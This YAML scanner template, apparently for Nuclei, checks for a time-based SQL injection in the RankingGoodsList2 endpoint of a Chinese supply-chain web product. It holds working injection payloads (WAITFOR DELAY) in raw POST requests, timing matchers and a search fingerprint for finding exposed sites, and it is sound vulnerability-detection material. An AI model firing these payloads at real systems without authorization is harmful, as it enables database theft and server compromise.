http:
    - matchers:
        - condition: and
          dsl:
            - duration_1>=4 && duration_1<=5
            - duration_2>=8 && duration_2<=9
          type: dsl
      raw:
        - |
          POST /Goods/RankingGoodsList2 HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36
          Content-Type: application/x-www-form-urlencoded; charset=UTF-8

          goodsSortType=Recommend&goodsTypeList%5B%5D=1%';WAITFOR DELAY '0:0:4'--
        - |
          POST /Goods/RankingGoodsList2 HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36
          Content-Type: application/x-www-form-urlencoded; charset=UTF-8

          goodsSortType=Recommend&goodsTypeList%5B%5D=1%';WAITFOR DELAY '0:0:8'--
id: dongwei-RankingGoodsList2-sql
info:
    author: Superhero
    description: |-
        fofa: body="/Content/Css/_SiteCss/"
        懂微百择唯·供应链 RankingGoodsList2 接口存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码,站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
    name: 懂微百择唯·供应链 RankingGoodsList2 SQL注入漏洞
    reference:
        - https://mp.weixin.qq.com/s/VXfEM3wAU3-oH_S-JLGFsw?token=635655052&lang=zh_CN
    severity: high
    tags: []
